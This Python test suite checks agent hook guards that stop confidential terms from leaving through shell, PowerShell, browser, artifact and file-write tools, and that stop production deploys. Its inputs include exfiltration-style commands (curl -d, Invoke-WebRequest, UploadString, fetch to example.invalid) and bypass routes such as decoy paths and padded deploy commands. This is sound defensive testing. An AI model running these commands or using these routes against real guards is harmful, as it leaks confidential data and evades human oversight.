#!/usr/bin/env python3
"""Egress-gate coverage beyond Bash and Edit/Write (cc-audit-army 2026-11-09, HIGH 1-4).

The audit of ora-claude-config @ 810e4fd found Hard Invariants 1-3 enforced only on the
Bash and Edit/Write paths. This suite pins the fixes, by BEHAVIOR (real subprocess runs of
the guards) rather than by matcher text:

  H1  Shell-capable tools other than Bash -- Desktop Commander start_process and
      interact_with_process, the terminal panel's run_in_terminal, and the PowerShell
      tool -- reach confidentiality-guard's egress-shell scan and ora-autonomy-gate's
      check_bash. Desktop Commander file writes (write_file, edit_block, write_pdf,
      move_file) reach both guards' path checks.
  H2  confidentiality-guard treats Artifact publish (including the local files it
      uploads), ArtifactData writes, ArtifactComments replies, the Claude Docs connector,
      browser form input / typing / scripting / navigation, and Excel writes into an
      egress path as egress surfaces.
  H3  pretooluse-dispatcher's emit_stdout merges permissionDecision by severity
      (deny > ask > allow), so a warn-only guard's 'allow' can never cancel a later deny.
  H4  override-mint-guard is wired into both dispatcher chains (and the wiring table).

Every term below is a clearly fake placeholder fed through CONFIDENTIAL_TERMS_FILE_OVERRIDE;
no real deal identifier appears in this file. BLOCK == exit 2, ALLOW == exit 0.

Run: python test-egress-tool-coverage.py   (exit 0 = all pass; exit 1 = any fail)
Stdlib only. ASCII-only. Windows (`python`).
"""
import datetime
import importlib.util
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import uuid
from contextlib import redirect_stdout, redirect_stderr

HOOKS = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONF = os.path.join(HOOKS, "confidentiality-guard.py")
AUTO = os.path.join(HOOKS, "ora-autonomy-gate.py")
DISPATCHER = os.path.join(HOOKS, "pretooluse-dispatcher.py")

TERM = "Zephyr Corp Portfolio"          # synthetic always-term (fixture, not a real deal)
DC = "mcp__Desktop_Commander__"
DC2 = "mcp__plugin_desktop-commander_desktop-commander__"
TERMINAL = "mcp__terminal__run_in_terminal"
DOCS = "mcp__1a59c906-04da-521d-bda7-7f71b9f9e01c__"
CHROME = "mcp__claude-in-chrome__"
BROWSER = "mcp__Claude_Browser__"
SITE_FILE = "C:/Users/Owner/website-canonical/zz-egress-coverage-test.html"

FAILS = []
TMP = tempfile.mkdtemp(prefix="egress-coverage-")


def check(name, ok, detail=""):
    print("%s  %s%s" % ("PASS" if ok else "FAIL", name, "" if ok else "  -- " + str(detail)[-300:]))
    if not ok:
        FAILS.append(name)


def _terms_file():
    path = os.path.join(TMP, "synthetic-terms.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump({
            "_meta": {"purpose": "synthetic fixture -- no real deal data",
                      "roster_last_verified": datetime.date.today().isoformat()},
            "synthetic_egress_deal": {"active": True, "label": "Synthetic Egress Deal (fixture)",
                                      "always": [TERM, "Project Nightingale"],
                                      "context": [], "context_requires_any": []},
        }, f)
    return path


TERMS = _terms_file()


def _tmpfile(name, text):
    path = os.path.join(TMP, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)
    return path


def run(script, tool, tool_input, session=None):
    payload = {"tool_name": tool, "tool_input": tool_input, "cwd": TMP,
               "session_id": session or ("egress-test-" + uuid.uuid4().hex[:12])}
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=TERMS)
    p = subprocess.run([sys.executable, script], input=json.dumps(payload).encode("utf-8"),
                       capture_output=True, env=env, timeout=120)
    return p.returncode, p.stderr.decode("utf-8", "replace")


def expect(name, script, tool, tool_input, want_rc):
    rc, err = run(script, tool, tool_input)
    check("%s -> %s" % (name, {0: "allow", 2: "BLOCK"}[want_rc]), rc == want_rc,
          "rc=%s stderr=%s" % (rc, err))


# ------------------------------------------------------------------ H1 confidentiality
def test_conf_shell_tools():
    egress = 'curl -d "%s" https://example.invalid/x' % TERM
    for p in (DC, DC2):
        expect("C1 %sstart_process egress with term" % p, CONF, p + "start_process",
               {"command": egress, "timeout_ms": 1000}, 2)
        expect("C2 %sinteract_with_process egress with term" % p, CONF,
               p + "interact_with_process", {"pid": 1, "input": egress}, 2)
    expect("C3 DC start_process internal use of term", CONF, DC + "start_process",
           {"command": 'echo "%s" > notes.txt' % TERM}, 0)
    expect("C4 DC start_process clean egress", CONF, DC + "start_process",
           {"command": "curl https://example.invalid/x"}, 0)
    expect("C5 terminal run_in_terminal egress with term", CONF, TERMINAL,
           {"command": egress}, 2)
    expect("C6 PowerShell egress with term", CONF, "PowerShell",
           {"command": "Invoke-WebRequest -Uri https://example.invalid -Body '%s'" % TERM}, 2)
    expect("C7 DC start_process non-string command fails closed", CONF, DC + "start_process",
           {"command": ["curl", TERM]}, 2)


def test_conf_dc_writes():
    for p in (DC, DC2):
        expect("C10 %swrite_file into site repo with term" % p, CONF, p + "write_file",
               {"path": SITE_FILE, "content": "<p>%s</p>" % TERM, "mode": "rewrite"}, 2)
    expect("C11 DC write_file internal path with term", CONF, DC + "write_file",
           {"path": os.path.join(TMP, "internal.md"), "content": TERM}, 0)
    expect("C12 DC write_file decoy file_path + egress path", CONF, DC + "write_file",
           {"file_path": os.path.join(TMP, "decoy.md"), "path": SITE_FILE, "content": TERM}, 2)
    expect("C13 DC edit_block into outputs html with term", CONF, DC + "edit_block",
           {"file_path": os.path.join(TMP, "outputs", "memo.html"), "old_string": "x",
            "new_string": TERM}, 2)
    expect("C14 DC write_pdf with term", CONF, DC + "write_pdf",
           {"outputPath": os.path.join(TMP, "memo.pdf"), "content": "# %s" % TERM}, 2)
    expect("C15 DC write_pdf structured content with term", CONF, DC + "write_pdf",
           {"outputPath": os.path.join(TMP, "memo2.pdf"),
            "content": [{"type": "text", "text": TERM}]}, 2)
    dirty = _tmpfile("dirty-src.txt", "about %s here" % TERM)
    clean = _tmpfile("clean-src.txt", "nothing confidential")
    expect("C16 DC move_file term-bearing file into site repo", CONF, DC + "move_file",
           {"source": dirty, "destination": SITE_FILE}, 2)
    expect("C17 DC move_file clean file into site repo", CONF, DC + "move_file",
           {"source": clean, "destination": SITE_FILE}, 0)
    expect("C18 DC move_file unreadable source into site repo fails closed", CONF,
           DC + "move_file", {"source": os.path.join(TMP, "missing.bin"),
                              "destination": SITE_FILE}, 2)
    expect("C19 DC write_file append into outputs with term", CONF, DC + "write_file",
           {"path": os.path.join(TMP, "outputs", "log.md"), "content": TERM, "mode": "append"}, 2)


# ------------------------------------------------------------------ H2 confidentiality
def test_conf_new_send_surfaces():
    dirty = _tmpfile("page.html", "<h1>%s</h1>" % TERM)
    clean = _tmpfile("clean.html", "<h1>hello</h1>")
    dirty_js = _tmpfile("data.js", "const d = '%s';" % TERM)
    expect("C20 Artifact publish of term-bearing page", CONF, "Artifact",
           {"file_path": dirty, "icon": "chart"}, 2)
    expect("C21 Artifact publish of clean page", CONF, "Artifact", {"file_path": clean}, 0)
    expect("C22 Artifact publish with term-bearing supporting file", CONF, "Artifact",
           {"file_path": clean, "files": {"data.js": dirty_js}}, 2)
    expect("C23 Artifact publish with {from} supporting file", CONF, "Artifact",
           {"file_path": clean, "files": {"data.js": {"from": dirty_js}}}, 2)
    expect("C24 Artifact asset upload batch", CONF, "Artifact",
           {"action": "publish", "asset": True, "url": "https://claude.ai/artifact/x",
            "file_paths": [clean, dirty]}, 2)
    expect("C25 Artifact publish title carries term", CONF, "Artifact",
           {"file_path": clean, "title": TERM}, 2)
    expect("C26 Artifact publish of unreadable file fails closed", CONF, "Artifact",
           {"file_path": os.path.join(TMP, "nope.html")}, 2)
    expect("C27 Artifact read is not egress", CONF, "Artifact",
           {"action": "read", "url": "https://claude.ai/artifact/x"}, 0)
    expect("C28 ArtifactData set with term", CONF, "ArtifactData",
           {"action": "set", "url": "u", "collection": "c", "doc_id": "d",
            "data": {"name": TERM}}, 2)
    expect("C29 ArtifactData set from term-bearing JSON file", CONF, "ArtifactData",
           {"action": "set", "url": "u", "collection": "c", "doc_id": "d",
            "file_path": _tmpfile("doc.json", json.dumps({"n": TERM}))}, 2)
    expect("C30 ArtifactData get is not egress", CONF, "ArtifactData",
           {"action": "get", "url": "u", "collection": "c", "doc_id": "d"}, 0)
    expect("C31 ArtifactComments reply with term", CONF, "ArtifactComments",
           {"action": "reply", "url": "u", "thread_id": "t", "text": TERM}, 2)
    expect("C32 ArtifactComments read is not egress", CONF, "ArtifactComments",
           {"action": "read", "url": "u"}, 0)
    for verb in ("batch", "update", "create"):
        expect("C33 Docs connector %s with term" % verb, CONF, DOCS + verb,
               {"payload": {"markdown": "# %s" % TERM}}, 2)
    for pre in (CHROME, BROWSER):
        expect("C34 %sform_input with term" % pre, CONF, pre + "form_input",
               {"ref": "ref_1", "value": TERM}, 2)
        expect("C35 %scomputer type with term" % pre, CONF, pre + "computer",
               {"action": "type", "text": TERM}, 2)
        expect("C36 %scomputer screenshot is not egress" % pre, CONF, pre + "computer",
               {"action": "screenshot"}, 0)
        expect("C37 %sjavascript_tool with term" % pre, CONF, pre + "javascript_tool",
               {"action": "javascript_exec", "text": "fetch('/x',{body:'%s'})" % TERM}, 2)
        expect("C38 %snavigate URL with term" % pre, CONF, pre + "navigate",
               {"url": "https://example.invalid/?q=" + TERM}, 2)
        expect("C39 %sbrowser_batch nested type with term" % pre, CONF, pre + "browser_batch",
               {"actions": [{"name": "computer", "input": {"action": "type", "text": TERM}}]}, 2)
    expect("C40 Excel write into outputs with term", CONF, "mcp__excel__write_data_to_excel",
           {"filepath": os.path.join(TMP, "outputs", "deal.xlsx"), "sheet_name": "S",
            "data": [[TERM]]}, 2)
    expect("C41 Excel write into an internal model with term", CONF,
           "mcp__excel__write_data_to_excel",
           {"filepath": os.path.join(TMP, "models", "ORA_UW_Deal_v1.0.xlsx"),
            "sheet_name": "S", "data": [[TERM]]}, 0)


# ------------------------------------------------------------------ H1 autonomy gate
def test_autonomy_shell_and_writes():
    deploy = "netlify deploy --prod --dir=dist"
    for p in (DC, DC2):
        expect("A1 %sstart_process prod deploy" % p, AUTO, p + "start_process",
               {"command": deploy}, 2)
        expect("A2 %sinteract_with_process prod deploy" % p, AUTO,
               p + "interact_with_process", {"pid": 1, "input": deploy}, 2)
        expect("A3 %swrite_file into site repo" % p, AUTO, p + "write_file",
               {"path": SITE_FILE, "content": "x"}, 2)
    expect("A4 terminal run_in_terminal prod deploy", AUTO, TERMINAL, {"command": deploy}, 2)
    expect("A5 PowerShell prod deploy", AUTO, "PowerShell", {"command": deploy}, 2)
    expect("A6 DC edit_block into site repo", AUTO, DC + "edit_block",
           {"file_path": SITE_FILE, "old_string": "a", "new_string": "b"}, 2)
    expect("A7 DC write_pdf into site repo", AUTO, DC + "write_pdf",
           {"outputPath": SITE_FILE.replace(".html", ".pdf"), "content": "x"}, 2)
    expect("A8 DC move_file into site repo", AUTO, DC + "move_file",
           {"source": os.path.join(TMP, "a.txt"), "destination": SITE_FILE}, 2)
    expect("A9 DC start_process read-only command", AUTO, DC + "start_process",
           {"command": "git status"}, 0)
    expect("A10 DC write_file outside the site", AUTO, DC + "write_file",
           {"path": os.path.join(TMP, "ok.md"), "content": "x"}, 0)
    expect("A11 DC read_file is not gated", AUTO, DC + "read_file",
           {"path": SITE_FILE}, 0)
    expect("A12 DC start_process non-string command fails closed", AUTO, DC + "start_process",
           {"command": {"x": 1}}, 2)


# ------------------------------------------------------------------ H3 dispatcher merge
def _load_dispatcher():
    spec = importlib.util.spec_from_file_location("_disp_under_test", DISPATCHER)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _decision(kind, reason, ctx=None):
    hso = {"hookEventName": "PreToolUse", "permissionDecision": kind,
           "permissionDecisionReason": reason}
    if ctx:
        hso["additionalContext"] = ctx
    return json.dumps({"hookSpecificOutput": hso})


def _merge(chunks):
    disp = _load_dispatcher()
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        disp.emit_stdout(chunks)
    text = out.getvalue()
    return (json.loads(text) if text.strip() else {}), err.getvalue()


def test_dispatcher_merge():
    got, _ = _merge([_decision("allow", "warn-only", "shared checkout note"),
                     _decision("deny", "rules.md is append-only")])
    hso = got.get("hookSpecificOutput", {})
    check("D1 allow then deny -> deny", hso.get("permissionDecision") == "deny", got)
    check("D2 deny keeps the deny's own reason",
          hso.get("permissionDecisionReason") == "rules.md is append-only", got)
    check("D3 the allow guard's additionalContext still delivered",
          "shared checkout note" in (hso.get("additionalContext") or ""), got)
    got, _ = _merge([_decision("allow", "a"), _decision("ask", "needs Gabriel")])
    hso = got.get("hookSpecificOutput", {})
    check("D4 allow then ask -> ask", hso.get("permissionDecision") == "ask"
          and hso.get("permissionDecisionReason") == "needs Gabriel", got)
    got, _ = _merge([_decision("deny", "first"), _decision("allow", "later")])
    check("D5 deny then allow -> deny (first reason)",
          got.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"
          and got["hookSpecificOutput"].get("permissionDecisionReason") == "first", got)
    got, _ = _merge([_decision("deny", "first"), _decision("deny", "second")])
    reason = got.get("hookSpecificOutput", {}).get("permissionDecisionReason", "")
    check("D6 two denies -> both reasons surfaced", "first" in reason and "second" in reason,
          got)
    got, _ = _merge([_decision("ask", "q"), _decision("deny", "no")])
    check("D7 ask then deny -> deny",
          got.get("hookSpecificOutput", {}).get("permissionDecision") == "deny", got)
    got, _ = _merge([_decision("allow", "a"), _decision("bogus", "?")])
    check("D8 an unknown decision value never outranks a known one",
          got.get("hookSpecificOutput", {}).get("permissionDecision") == "allow", got)


def test_dispatcher_end_to_end_deny_survives():
    """A real chain run: a stub allow-guard ahead of a stub deny-guard. Before the fix the
    harness received permissionDecision 'allow' and the write went through."""
    root = os.path.join(TMP, "disp-e2e")
    os.makedirs(os.path.join(root, "lib"), exist_ok=True)
    shutil.copy(DISPATCHER, os.path.join(root, "pretooluse-dispatcher.py"))
    stub = ("import json, sys\n\n\ndef main():\n    sys.stdin.read()\n"
            "    print(json.dumps({'hookSpecificOutput': {'hookEventName': 'PreToolUse',"
            " 'permissionDecision': %r, 'permissionDecisionReason': %r}}))\n")
    for name, kind, reason in (("stub-allow", "allow", "warn"), ("stub-deny", "deny", "blocked")):
        with open(os.path.join(root, name + ".py"), "w") as f:
            f.write(stub % (kind, reason))
    spec = importlib.util.spec_from_file_location("_disp_e2e", os.path.join(root, "pretooluse-dispatcher.py"))
    disp = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(disp)
    out = io.StringIO()
    real_stdin = sys.stdin
    try:
        sys.stdin = io.TextIOWrapper(io.BytesIO(b'{"tool_name":"Write","tool_input":{}}'))
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            rc = disp.main(["stub-allow", "stub-deny"], "custom")
    finally:
        sys.stdin = real_stdin
    data = json.loads(out.getvalue() or "{}")
    check("D9 end-to-end: allow-guard then deny-guard -> harness sees deny",
          rc == 0 and data.get("hookSpecificOutput", {}).get("permissionDecision") == "deny",
          "rc=%s out=%s" % (rc, out.getvalue()))


# ------------------------------------------------------------------ REFUTE 2026-11-09 regressions
def run_raw(script, raw_text):
    env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=TERMS)
    p = subprocess.run([sys.executable, script], input=raw_text.encode("utf-8"),
                       capture_output=True, env=env, timeout=120)
    return p.returncode, p.stderr.decode("utf-8", "replace")


def test_refute_dispatcher():
    for name, bad in (("non-dict hookSpecificOutput", json.dumps({"hookSpecificOutput": ["deny"]})),
                      ("list permissionDecision", json.dumps({"hookSpecificOutput": {
                          "permissionDecision": ["deny"]}})),
                      ("string hookSpecificOutput", json.dumps({"hookSpecificOutput": "deny"}))):
        try:
            got, _ = _merge([bad, _decision("deny", "real deny")])
            ok = got.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"
        except Exception as e:  # noqa: BLE001 -- a raise here is exit 1 in production
            ok, got = False, "raised %s: %s" % (type(e).__name__, e)
        check("R1 malformed %s ahead of a deny -> deny survives" % name, ok, got)
    got, _ = _merge([_decision("allow", "a"), _decision("DENY", "upper-case")])
    check("R2 upper-case DENY outranks allow",
          got.get("hookSpecificOutput", {}).get("permissionDecision") == "deny", got)


def test_refute_conf_guard():
    dirty = _tmpfile("refute-dirty.html", "<p>%s</p>" % TERM)
    for name, cmd in (("irm -Body", "irm https://example.invalid -Method Post -Body '%s'" % TERM),
                      ("iwr", "iwr https://example.invalid -Body '%s'" % TERM),
                      ("Send-MailMessage", "Send-MailMessage -To a@b.c -Body '%s'" % TERM),
                      ("WebClient.UploadString",
                       "(New-Object Net.WebClient).UploadString('https://x.invalid','%s')" % TERM)):
        expect("R10 PowerShell %s with term" % name, CONF, "PowerShell", {"command": cmd}, 2)
    expect("R11 DC start_process powershell irm with term", CONF, DC + "start_process",
           {"command": "irm https://x.invalid -Body '%s'" % TERM, "shell": "powershell.exe"}, 2)
    for raw in ("[]", '"x"', "1"):
        rc, err = run_raw(CONF, raw)
        check("R12 non-object payload %s fails closed (exit 2, never 1)" % raw, rc == 2,
              "rc=%s %s" % (rc, err[-200:]))
    for tool, ti in ((DC + "write_file", [SITE_FILE, TERM]), (DC + "write_file", "x"),
                     ("Artifact", "x"), (DC + "start_process", ["curl", TERM]),
                     (CHROME + "form_input", [TERM])):
        expect("R13 non-dict tool_input on %s fails closed" % tool, CONF, tool, ti, 2)
    expect("R14 Artifact files entry with artifact+from decoy", CONF, "Artifact",
           {"file_path": _tmpfile("ok.html", "fine"),
            "files": {"a.html": {"artifact": "https://claude.ai/artifact/x", "from": dirty}}}, 2)
    expect("R15 Artifact unknown action carrying a dirty file", CONF, "Artifact",
           {"action": "update", "file_path": dirty}, 2)
    expect("R16 ArtifactComments unknown action with term", CONF, "ArtifactComments",
           {"action": "create", "url": "u", "text": TERM}, 2)
    expect("R17 ArtifactData unknown action from dirty file", CONF, "ArtifactData",
           {"action": "import", "url": "u", "file_path": dirty}, 2)
    expect("R18 Artifact read still allowed", CONF, "Artifact", {"action": "read", "url": "u"}, 0)
    payload = {"tool_name": DC + "write_file", "cwd": "C:/Users/Owner/website-canonical",
               "tool_input": {"path": "zz-relative.html", "content": TERM},
               "session_id": "egress-test-rel"}
    rc, err = run_raw(CONF, json.dumps(payload))
    check("R19 relative DC write resolved against payload cwd (site repo) -> BLOCK", rc == 2,
          "rc=%s %s" % (rc, err[-200:]))
    ws = "C:\\Users\\Owner\\ws-egress-test"  # Windows-style cwd: joins become mixed-slash
    for name, tool, ti in (
            ("DC write_file outputs/", DC + "write_file", {"path": "outputs/x.txt", "content": TERM}),
            ("DC write_file dist/", DC + "write_file", {"path": "dist/x.js", "content": TERM}),
            ("Excel write outputs/", "mcp__excel__write_data_to_excel",
             {"filepath": "outputs/x.xlsx", "sheet_name": "S", "data": [[TERM]]})):
        rc, err = run_raw(CONF, json.dumps({"tool_name": tool, "tool_input": ti, "cwd": ws,
                                            "session_id": "egress-test-rel2"}))
        check("R22 relative %s under a backslash cwd -> BLOCK" % name, rc == 2,
              "rc=%s %s" % (rc, err[-200:]))
    dirty_src = _tmpfile("rel-move-src.txt", TERM)
    rc, err = run_raw(CONF, json.dumps({"tool_name": DC + "move_file", "cwd": ws, "session_id": "s",
                                        "tool_input": {"source": dirty_src,
                                                       "destination": "outputs/x.txt"}}))
    check("R23 relative move_file into outputs/ under a backslash cwd -> BLOCK", rc == 2,
          "rc=%s %s" % (rc, err[-200:]))
    big = os.path.join(TMP, "bigdir")
    for i in range(260):
        sub = os.path.join(big, "d%02d" % (i % 13))
        os.makedirs(sub, exist_ok=True)
        with open(os.path.join(sub, "f%03d.txt" % i), "w") as f:
            f.write("clean")
    import time as _t
    t0 = _t.monotonic()
    rc, err = run(CONF, "Artifact", {"file_path": big})
    check("R24 directory publish past the file cap fails closed, promptly",
          rc == 2 and _t.monotonic() - t0 < 30, "rc=%s %.1fs" % (rc, _t.monotonic() - t0))
    expect("R20 browser upload_image of a term-bearing file", CONF, CHROME + "upload_image",
           {"imagePath": dirty, "ref": "ref_1"}, 2)
    expect("R21 browser computer key input with term", CONF, CHROME + "computer",
           {"action": "key", "text": TERM}, 2)


def test_refute_autonomy():
    site_win = SITE_FILE.replace("/", "\\")
    for name, cmd in (("Copy-Item", "Copy-Item a.html %s" % site_win),
                      ("Move-Item", "Move-Item a.html %s" % site_win),
                      ("[IO.File]::WriteAllText", "[IO.File]::WriteAllText('%s','x')" % site_win),
                      ("robocopy", "robocopy dist C:\\Users\\Owner\\website-canonical /MIR"),
                      ("ntl deploy --prod", "ntl deploy --prod"),
                      ("netlify deploy -p", "netlify deploy -p --dir=dist")):
        expect("R30 PowerShell %s" % name, AUTO, "PowerShell", {"command": cmd}, 2)
    expect("R31 draft deploy after mkdir -p is NOT a prod deploy", AUTO, "PowerShell",
           {"command": "mkdir -p dist && netlify deploy --dir=dist"}, 0)
    payload = {"tool_name": DC + "write_file", "cwd": "C:/Users/Owner/website-canonical",
               "tool_input": {"path": "index.html", "content": "x"},
               "session_id": "egress-test-" + uuid.uuid4().hex[:12]}
    rc, err = run_raw(AUTO, json.dumps(payload))
    check("R32 relative DC write resolved against payload cwd (site repo) -> BLOCK", rc == 2,
          "rc=%s %s" % (rc, err[-200:]))
    import time as _t
    padded = "ntl deploy " + "deploy " * 30000 + "--prod"   # ~210 KB; was ~50 s quadratic
    t0 = _t.monotonic()
    rc, err = run(AUTO, DC + "interact_with_process", {"pid": 1, "input": padded})
    check("R35 padded prod deploy blocks in linear time", rc == 2 and _t.monotonic() - t0 < 10,
          "rc=%s %.1fs" % (rc, _t.monotonic() - t0))
    padded_p = "netlify deploy " + "x " * 100000 + "-p"
    t0 = _t.monotonic()
    rc, err = run(AUTO, DC + "interact_with_process", {"pid": 1, "input": padded_p})
    check("R36 padded short-flag prod deploy blocks in linear time",
          rc == 2 and _t.monotonic() - t0 < 10, "rc=%s %.1fs" % (rc, _t.monotonic() - t0))
    expect("R37 Excel tool with an unlisted write prefix still reaches the gate", AUTO,
           "mcp__excel__set_cell_value",
           {"filepath": "C:/Users/Owner/website-canonical/data.xlsx", "value": "x"}, 2)
    expect("R33 Excel write into the site tree", AUTO, "mcp__excel__write_data_to_excel",
           {"filepath": "C:/Users/Owner/website-canonical/data.xlsx", "sheet_name": "S",
            "data": [["x"]]}, 2)
    expect("R34 Excel read of a site workbook is not gated", AUTO,
           "mcp__excel__read_data_from_excel",
           {"filepath": "C:/Users/Owner/website-canonical/data.xlsx", "sheet_name": "S"}, 0)


# ------------------------------------------------------------------ H4 override-mint wiring
def test_override_mint_wired():
    disp = _load_dispatcher()
    check("M1 override-mint-guard in the Edit/Write chain",
          "override-mint-guard" in disp.GUARD_CHAIN)
    check("M2 override-mint-guard in the Bash chain",
          "override-mint-guard" in disp.BASH_GUARD_CHAIN)
    check("M3 ascii-only-guard still LAST in the Edit/Write chain",
          disp.GUARD_CHAIN[-1] == "ascii-only-guard")
    check("M4 pipe-mask-guard still LAST in the Bash chain",
          disp.BASH_GUARD_CHAIN[-1] == "pipe-mask-guard")


def main():
    try:
        test_conf_shell_tools()
        test_conf_dc_writes()
        test_conf_new_send_surfaces()
        test_autonomy_shell_and_writes()
        test_dispatcher_merge()
        test_dispatcher_end_to_end_deny_survives()
        test_override_mint_wired()
        test_refute_dispatcher()
        test_refute_conf_guard()
        test_refute_autonomy()
    finally:
        shutil.rmtree(TMP, ignore_errors=True)
    if FAILS:
        print("\n%d FAILURE(S): %s" % (len(FAILS), ", ".join(FAILS)))
        return 1
    print("\nALL egress-tool-coverage tests passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
